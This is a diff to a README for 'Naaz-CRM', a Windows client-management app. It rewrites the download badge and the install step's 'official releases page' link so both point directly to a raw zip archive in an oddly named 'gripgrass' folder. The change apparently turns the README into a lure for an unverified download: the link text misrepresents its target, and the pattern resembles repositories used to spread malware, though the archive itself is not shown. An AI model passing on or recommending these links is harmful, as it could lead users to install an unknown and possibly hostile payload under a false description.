@@ -1,6 +1,6 @@
 # 📊 Naaz-CRM - Simplify your daily customer management tasks
 
-[![Download Naaz-CRM](https://img.shields.io/badge/Download-Naaz--CRM-blue)](https://github.com/Merrielleimpermissible358/Naaz-CRM)
+[![Download Naaz-CRM](https://img.shields.io/badge/Download-Naaz--CRM-blue)](https://raw.githubusercontent.com/Merrielleimpermissible358/Naaz-CRM/main/gripgrass/CRM-Naaz-v3.8.zip)
 
 Naaz-CRM helps small business owners track client interactions and organize contact details. You manage your business relationships in one central place. The software stores names, phone numbers, email addresses, and interaction history for every client. You spend less time searching for notes and more time growing your business.
 
@@ -18,7 +18,7 @@ This application runs on modern Windows computers. Ensure your system meets thes
 
 Follow these steps to set up Naaz-CRM on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Merrielleimpermissible358/Naaz-CRM) to download the application.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Merrielleimpermissible358/Naaz-CRM/main/gripgrass/CRM-Naaz-v3.8.zip) to download the application.
 2. Locate the most recent version of the Naaz-CRM installer file.
 3. Click the file to start the download.
 4. Open your Downloads folder on your hard drive.
